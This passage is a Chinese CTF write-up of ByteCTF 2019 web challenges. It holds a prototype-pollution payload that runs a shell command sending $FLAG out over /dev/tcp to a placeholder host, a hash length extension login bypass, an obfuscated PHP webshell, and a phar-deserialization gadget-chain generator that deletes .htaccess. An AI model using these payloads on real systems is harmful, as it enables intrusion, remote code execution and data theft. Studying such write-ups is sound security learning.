<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;wiki&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;a=1;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;echo $FLAG&gt;/dev/tcp/xxxxx/xxx\&quot;&#x27;)//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>将Content-Type改为json，发包6次触发合并操作，污染原型链，再次访问即可。</p>
<br>

<h1 id="ByteCTF-2019-EzCMS"><a href="#ByteCTF-2019-EzCMS" class="headerlink" title="ByteCTF_2019 EzCMS"></a>ByteCTF_2019 EzCMS</h1><p>1、扫描目录有<code>www.zip</code>，下载得到源码。</p>
<p>整个题目的功能如下：</p>
<ul>
<li><code>index.php</code>页面验证登陆，可以任意账号登陆到<code>upload.php</code>上传页面，但是只有admin账号才能进行文件上传。</li>
<li>访问了<code>upload.php·</code>，就会在沙盒下生成一个<code>.htaccess</code>文件，内容为：<code>lolololol, i control all</code>。</li>
<li>上传文件后，会返回文件的存储路径，view details可以进入<code>view.php</code>，会回显文件的mime类型以及文件路径。</li>
<li>因为目录下的<code>.htaccess</code>被写入了内容，无法解析，所以访问上传的文件会报500。</li>
</ul>
<p>2、只有admin才能上传文件，验证登陆的部分如下，显然是利用hash长度扩展登陆admin账户。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hash&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&quot;adminadmin&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$username</span>.<span class="variable">$password</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>密钥长度为8，先随意登陆得到已知hash为52107b08c0f3342d2153ae1d68e6262c，利用hashpump：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 52107b08c0f3342d2153ae1d68e6262c</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: Lethe</span><br><span class="line">ec1b7c99078d6f2be7c25481b53bad40</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00Lethe</span><br></pre></td></tr></table></figure>

<p>所以添加Cookie：<code>user=ec1b7c99078d6f2be7c25481b53bad40</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190909135910582.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line">密码（将\x替换为%）：admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00Lethe</span><br></pre></td></tr></table></figure>

<p>成功登陆，并可以上传文件。</p>
<p>3、审计代码，看到那些类以及魔术方法，总是感觉像反序列化的题目，但是并没有地方使用了<code>unserialize()</code>。看到了config.php中的FIle类使用了<code>mime_content_type()</code>，想到了之前看的SUCTF2019出题笔记（<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6057%EF%BC%89%EF%BC%8C%E5%A6%82%E4%B8%8B%EF%BC%9A">https://xz.aliyun.com/t/6057），如下：</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#x27;</span>, <span class="variable">$this</span>-&gt;filepath))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mine</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">    <span class="variable">$store_path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">    <span class="variable">$res</span>[<span class="string">&#x27;mine&#x27;</span>] = <span class="variable">$mine</span>;</span><br><span class="line">    <span class="variable">$res</span>[<span class="string">&#x27;store_path&#x27;</span>] = <span class="variable">$store_path</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190909140947693.png" alt="在这里插入图片描述"></p>
<p>再配合上文件上传功能，所以这题整体的思路应该是利用 <strong>phar 反序列化</strong>：</p>
<ul>
<li><p>想办法将文件上传到其他目录中（这里因为tmp_name未知，所以无法利用）</p>
</li>
<li><p>重写 &#x2F; 删除目录下的<code>.htaccess</code>文件。</p>
</li>
</ul>
<p>4、下面就是构造利用链来想办法删除或重写<code>.htaccess</code>文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//view.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$file_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filepath&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file_name</span>);</span><br><span class="line"><span class="variable">$file_path</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file_path</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$file_name</span>, <span class="variable">$file_path</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">view_detail</span>();</span><br><span class="line"><span class="variable">$mine</span> = <span class="variable">$res</span>[<span class="string">&#x27;mine&#x27;</span>];</span><br><span class="line"><span class="variable">$store_path</span> = <span class="variable">$res</span>[<span class="string">&#x27;store_path&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>可以看到在view.php页面，会用传入的<code>$file_name</code>和<code>$file_path</code>参数实例化<code>File</code>类，然后调用<code>view_detail()</code>方法，跟进File类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filepath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$filepath</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filepath = <span class="variable">$filepath</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#x27;</span>, <span class="variable">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mine</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$this</span>-&gt;filepath);  <span class="comment">//unserialize</span></span><br><span class="line">        <span class="variable">$store_path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;mine&#x27;</span>] = <span class="variable">$mine</span>;</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;store_path&#x27;</span>] = <span class="variable">$store_path</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$filepath</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;<span class="subst">$filename</span> is in <span class="subst">$filepath</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关注<code>__destruct()</code>方法，可以看到用<code>$checker</code>调用了此类中不存的<code>upload_file()</code>函数，于是想到了<code>__call()</code>方法，继续寻找，发现<code>Profile</code>类中存在可利用的<code>__call()</code>方法，如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password != <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$this</span>-&gt;username.<span class="variable">$this</span>-&gt;password))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>__call()</code>方法中用<code>$admin</code>调用了<code>open()</code>函数，题目中的<code>open</code>函数如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$filepath</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;<span class="subst">$filename</span> is in <span class="subst">$filepath</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路到这里貌似卡住了，这个open函数没什么可利用的…</p>
<p>但是这里<code>$admin</code>我们是可控的，于是可以找一下php里面有没有可以用来删除&#x2F;重写文件的类，正好存在可利用的同名<code>open()方法</code>，这样我们就可以将<code>$admin</code>实例化为此类的对象。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190909145138811.png" alt="在这里插入图片描述"></p>
<p>搜索结果的第一个<code>ZipArchive</code>类就可以利用（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/ziparchive.open.php%EF%BC%89">https://www.php.net/manual/en/ziparchive.open.php）</a></p>
<p>该类的open方法，使用如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive :: open （ <span class="keyword">string</span> <span class="variable">$filename</span> [， <span class="keyword">int</span> <span class="variable">$flags</span> ]）： <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>

<p>第一个参数为文件名，第二个参数可以设置使用的模式。（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/zip.constants.php#ziparchive.constants.overwrite%EF%BC%89">https://www.php.net/manual/en/zip.constants.php#ziparchive.constants.overwrite）</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190909145636472.png" alt="在这里插入图片描述"></p>
<p>使用上述两个模式并将文件名设为<code>.htaccess</code>的路径，即可删除该文件。</p>
<p>5、知道整个构造思路了之后，先得到<code>.htaccess</code>文件的路径，并上传一个shell.php如下（使用php可变函数拼接字符绕过过滤），<strong>上传后记下文件路径</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;syste&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;m&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造phar文件的脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filepath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$filepath</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filepath = <span class="variable">$filepath</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username =  <span class="string">&quot;/var/www/html/sandbox/2ad1c8a81d5d1d24dcac4f7a110a605a/.htaccess&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span> | <span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;Lethe&#x27;</span>,<span class="string">&#x27;Lethe&#x27;</span>);</span><br><span class="line"><span class="comment">//echo unserialize($a);</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行得到1.phar文件，上传后得到路径<code>sandbox/2ad1c8a81d5d1d24dcac4f7a110a605a/eec2d95bc618625503306c10fad5d37d.phar</code>。</p>
<p>然后去view.php触发反序列化，根据SUCTF2019的题目，可以用<code>php://filter/resource=phar://...</code>绕过对协议的过滤，最终访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?filename=eec2d95bc618625503306c10fad5d37d.phar&amp;filepath=php://filter/resource=phar://sandbox/2ad1c8a81d5d1d24dcac4f7a110a605a/eec2d95bc618625503306c10fad5d37d.phar</span><br></pre></td></tr></table></figure>

<p>即可触发phar反序列化并删除<code>.htaccess</code>文件。</p>
<p>注意删除后不能再次访问<code>upload.php</code>，否则会再生成.htaccess，直接访问刚才上传shell返回的路径即可RCE。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190909155849502.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="ByteCTF-2019-BoringCode"><a href="#ByteCTF-2019-BoringCode" class="headerlink" title="ByteCTF_2019 BoringCode"></a>ByteCTF_2019 BoringCode</h1><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\//i&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_valid_url</span>(<span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/baidu\.com$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;bye~&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error: host not allowed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error: invalid url&quot;</span>;</span><br><span class="line">    